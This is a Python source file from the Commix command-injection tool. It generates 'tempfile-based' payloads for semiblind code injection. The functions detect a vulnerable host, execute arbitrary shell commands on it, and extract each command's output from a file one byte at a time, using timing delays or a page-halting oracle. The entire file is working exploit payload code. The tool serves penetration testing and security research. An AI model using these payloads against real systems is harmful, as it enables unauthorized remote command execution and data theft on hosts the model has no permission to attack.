#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The "tempfile-based" injection technique on Semiblind Code Injection.
The available "tempfile-based" payloads.

Nothing here spells out a language: the expressions come from the grammar of whichever one is being
evaluated. One payload also serves either operating system, the redirection being the shell's own.
"""

# The command, run from inside the string being evaluated, its output going to the file.
def _write(cmd, OUTPUT_TEXTFILE):
  return settings.EVAL_GRAMMAR.run(cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE)

# The file's contents, as the language sees them. The language indexes the text itself, so nothing
# rewrites the file as ordinals first and no 'tr', 'od' or 'awk' is asked of the target.
def _contents(OUTPUT_TEXTFILE):
  return settings.EVAL_GRAMMAR.trim(settings.EVAL_GRAMMAR.read_file(OUTPUT_TEXTFILE))

# A statement terminator, where the boundary being tested can carry one.
def _end(separator):
  return settings.EVAL_GRAMMAR.TERMINATOR if separator else ""

# Delay only while the condition holds: a boolean times the delay is the delay or nothing at all.
def _conditional_sleep(condition, timesec, separator):
  # Whole seconds: the delay is counted in them, and a fractional one only reads as noise.
  return settings.EVAL_GRAMMAR.delay(int(timesec), condition) + _end(separator)

# Write the output to the file and measure what landed there. Joined by the language's concatenation
# operator, since what the boundary breaks into is an expression rather than a statement.
def _write_and_measure(cmd, j, OUTPUT_TEXTFILE, timesec, separator, operator):
  condition = str(j) + operator + settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE))
  return settings.EVAL_GRAMMAR.sequence(_write(cmd, OUTPUT_TEXTFILE),
                                        _conditional_sleep(condition, timesec, separator))

"""
Tempfile-based decision payload (check if host is vulnerable).
"""
def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  return _write_and_measure("echo " + TAG, j, OUTPUT_TEXTFILE, timesec, separator, settings.EVAL_GRAMMAR.COMPARISON["-eq"])

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  return decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)

"""
Delay while a condition of the caller's own holds.
"""
def condition_check(separator, condition, timesec, http_request_method):
  # Stated in the shell's spelling, as every other technique states it, so it is rewritten first.
  condition = condition.strip()
  if condition.startswith("-s "):
    # Read the way the contents are read anywhere else here, so no quote has to survive a boundary.
    condition = settings.EVAL_GRAMMAR.length(_contents(condition[3:].strip())) + settings.EVAL_GRAMMAR.COMPARISON["-gt"] + "0"
  else:
    for shell_operator, operator in settings.EVAL_GRAMMAR.COMPARISON.items():
      condition = condition.replace(settings.SINGLE_WHITESPACE + shell_operator + settings.SINGLE_WHITESPACE, operator)
  return _conditional_sleep(condition, timesec, separator)

"""
Windows counterpart of condition_check() above - the language answers the same on either operating
system, so there is nothing separate to ask for.
"""
def windows_condition_check(separator, expr, expected, timesec):
  return None

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
  settings.USER_APPLIED_CMD = cmd
  return _write_and_measure(cmd, j, OUTPUT_TEXTFILE, timesec, separator, settings.EVAL_GRAMMAR.COMPARISON[operator])

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  return cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  # The guess stays left of the operator, as it does elsewhere: the search reads the answer as "the
  # byte is at or above this", and an operand order of its own would send it into the wrong half.
  ordinal = settings.EVAL_GRAMMAR.ordinal(_contents(OUTPUT_TEXTFILE), num_of_chars - 1)
  return _conditional_sleep(str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON[operator] + ordinal, timesec, separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  return get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator)

"""
Check for false positive result.

What the file holds here is a small sum, and the caller looks for it among the values it could have
been - so the contents are read as a number rather than indexed for the ordinal of a byte.
"""
def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  condition = str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + settings.EVAL_GRAMMAR.to_number(_contents(OUTPUT_TEXTFILE))
  return _conditional_sleep(condition, timesec, separator)

"""
Everything below reads the same created file back through a calibrated oracle instead of a delay -
nothing here waits, so what a condition changes is read off the page itself. The condition is put the
same way 'halt()' already puts one for this sink's own boolean-based technique: true leaves the page
as it was building, false stops it where it stood.
"""

"""
Every boundary this sink can carry a statement on can carry this - the language answers the same
question whichever separator broke into its string.
"""
def oracle_supported(separator):
  return True

"""
Write a command's output into the created file once - nothing here asks a question, so nothing here
waits.
"""
def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
  return _write(cmd, OUTPUT_TEXTFILE) + _end(separator)

"""
A question with a known answer, for telling whether this target's own oracle can tell a length that
matches from one that does not - written and read back in the one expression, since the file's
contents are not yet known to be readable at all.
"""
def oracle_decision(separator, TAG, output_length, OUTPUT_TEXTFILE, holds=True):
  expected = str(output_length if holds else output_length + 1)
  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + expected
  payload = settings.EVAL_GRAMMAR.sequence(_write("echo " + TAG, OUTPUT_TEXTFILE), settings.EVAL_GRAMMAR.halt(condition))
  return payload + _end(separator)

"""
How many bytes the created file holds, asked as a comparison so that it can be bisected - the file's
length rather than the command's, read without running the command again.
"""
def oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator="-ge"):
  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + settings.EVAL_GRAMMAR.COMPARISON[operator] + str(candidate_length)
  return settings.EVAL_GRAMMAR.halt(condition) + _end(separator)

"""
Whether the ordinal of the created file's Nth byte is at or above this one, which is what bisects it
- the language indexes the file's own text, so nothing here rewrites it as ordinals first.
"""
def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator="-le"):
  ordinal = settings.EVAL_GRAMMAR.ordinal(_contents(OUTPUT_TEXTFILE), num_of_chars - 1)
  condition = str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON[operator] + ordinal
  return settings.EVAL_GRAMMAR.halt(condition) + _end(separator)

# eof
